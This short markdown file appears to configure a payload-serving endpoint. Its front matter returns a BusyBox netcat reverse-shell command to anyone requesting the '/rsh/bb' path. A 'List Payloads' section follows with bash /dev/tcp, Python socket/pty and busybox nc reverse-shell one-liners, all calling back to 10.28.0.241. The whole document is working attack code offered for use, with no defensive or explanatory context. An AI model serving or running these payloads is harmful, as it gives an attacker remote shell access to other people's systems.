---
title: BusyBox Reverse Shell
description: BusyBox Reverse Shell
weight: 1
pattern: /rsh/bb$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.28.0.241 9091 >/tmp/f

---

List Payloads

```shell
# bash
    bash -i >& /dev/tcp/10.28.0.241/9091 0>&1
    0<&196;exec 196<>/dev/tcp/10.28.0.241/9091; sh <&196 >&196 2>&196
    /bin/bash -l > /dev/tcp/10.28.0.241/9091 0<&1 2>&1

#python

    import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.28.0.241",9091));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
#busybox nc
  rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.28.0.241 9092 >/tmp/f
```


